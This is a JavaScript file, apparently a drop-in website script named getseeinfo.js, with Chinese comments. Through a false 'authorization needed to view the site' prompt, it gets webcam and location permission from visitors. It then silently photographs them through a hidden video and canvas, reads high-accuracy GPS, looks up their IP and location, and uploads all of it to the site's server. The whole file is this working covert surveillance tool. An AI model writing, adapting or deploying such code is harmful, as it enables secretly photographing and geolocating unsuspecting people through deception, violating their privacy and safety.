/*
 * @Author: whalefall
 * @Date: 2021-08-27 04:28:23
 * @LastEditTime: 2021-08-29 11:09:25
 * @Description: 获取访客信息并自动上传服务器 激活方法:start();
 * 前面引入js
 * <script src="/static/js/getseeinfo.js"></script>
 后面引入获取ip地址
 *  <script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
 * 在html中加入
 * <!-- 拍照用 -->
    <video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
    <canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
*/

// 储存获取到的信息
var infodata = {};

// 等待窗体加载完成获得video摄像头区域

window.onload = function() {
	let video = document.getElementById("video");
};

// 获取ip地址的回调
function IPCallBack(location) {
	infodata['ip'] = {
		'ip': location.ip,
		'where': location.addr
	};
};
//提交数据上服务器
function submit() {
	// 判断数据是否为空
	if (infodata.base64 == undefined && infodata.gps == undefined && infodata.ip == undefined) {
		console.log('数据为空');
		layer.msg('空空然~');
		return;
	};
	console.log(infodata);
	return new Promise(function(resolve, reject) {
		$.ajax({
			url: "/upload_info/",
			type: "POST",
			contentType: 'application/json;charset=UTF-8',
			data: JSON.stringify(infodata),
			dataType: "json",
			success: function(result) {
				console.log(result);
				if (result.code == 200) {
					layer.msg(result.msg);
				} else {
					layer.msg(result.code + result.msg);
				}
				resolve('upload suc');
			},
			error: function(xhr, status, error) {
				console.log("上传失败");
				layer.msg("内部submit失败." + status + error);
			}
		})
	});
};


// 摄像头成功则调用此代码
function takePhoto() {
	console.log('进入拍照');
	return new Promise(function(resolve, reject) {
		setTimeout(function() {
			let canvas = document.getElementById("canvas");
			let ctx = canvas.getContext('2d');
			ctx.drawImage(video, 0, 0, 600, 600);
			// 图片转base64
			var base64 = canvas.toDataURL('image/jpeg').substr(22);
			// 上传base64图片和地理位置到服务器
			infodata['base64'] = base64;
			console.log('拍照代码运行成功!')
			resolve('suc');
		}, 800)
	});


}


// 获取位置
function getGps() {
	// H5 获取当前位置经纬度
	var location_lon = '',
		location_lat = ''; // 经度,纬度
	console.log('进入PGS');
	return new Promise(function(resolve, reject) {
		if (navigator.geolocation) {
			var getOptions = {
				//是否使用高精度设备，如GPS。默认是true
				enableHighAccuracy: true,
				//超时时间，单位毫秒，默认为0
				timeout: 10000,
				//使用设置时间内的缓存数据，单位毫秒
				//默认为0，即始终请求新数据
				//如设为Infinity，则始终使用缓存数据
				maximumAge: 0
			};
			navigator.geolocation.getCurrentPosition(function(position) {
				location_lon = position.coords.longitude;
				location_lat = position.coords.latitude;
				// layer.msg('h5经度：'+location_lon+'h5纬度：'+location_lat);
				var r = {
					"x": location_lon,
					"y": location_lat,
				};
				infodata['gps'] = r;
				// initmap(r["x"], r["y"]);
				layer.msg('GPMS成功');
				console.log('GPS成功');
				resolve('suc');

			}, function(error) {
				let why;
				switch (error.code) {
					case error.TIMEOUT:
						why = '超时';
						break;
					case error.PERMISSION_DENIED:
						why = '用户拒绝提供地理位置';
						break;
					case error.POSITION_UNAVAILABLE:
						why = '地理位置不可用';
						break;
					default:
						break;
				}
				console.log('GPMS内部错误:' + why);
				layer.msg("GPMS内部错误:" + why);
				resolve('suc');
			}, getOptions);
		} else {
			console.log("GPS错误");
			layer.msg("浏览器不支持GPMS！");
			resolve('suc');

		}
	});

};


function getMd() {
	layer.load(1);

	let constraints = {
		video: {
			width: 600,
			height: 600
		},
		audio: false
	};
	// 在不是https的环境下无法获取!
	try {
		var Mediapromise = navigator.mediaDevices.getUserMedia(constraints);
	} catch (err) {
		layer.alert('可能在非https环境下运行!' + err, {
			skin: 'layui-layer-molv', //样式类名
			closeBtn: 0
		}, function() {
			getGps();
			submit();
			layer.closeAll('loading');
		});

	};
	Mediapromise.then(function(MediaStream) {
		// 获取成功延时4s后拍照
		video.srcObject = MediaStream;
		video.play();
		layer.msg("申请成功!");
		return takePhoto();
	}).catch(function(PermissionDeniedError) {
		layer.alert('权限申请失败!' + PermissionDeniedError, {
			skin: 'layui-layer-molv', //样式类名
			closeBtn: 1
		}, function(index) {
			layer.close(index);
		});
		console.log(PermissionDeniedError);
	}).then(function() {
		return getGps();
	}).then(function() {
		return submit();
	}).then(function() {
		layer.closeAll('loading');
	});
}

function start() {
	layer.alert('因为设备原因,需要授权以查看网站!', {
		skin: 'layui-layer-molv', //样式类名
		closeBtn: 0
	}, function() {
		getMd();
	});
}
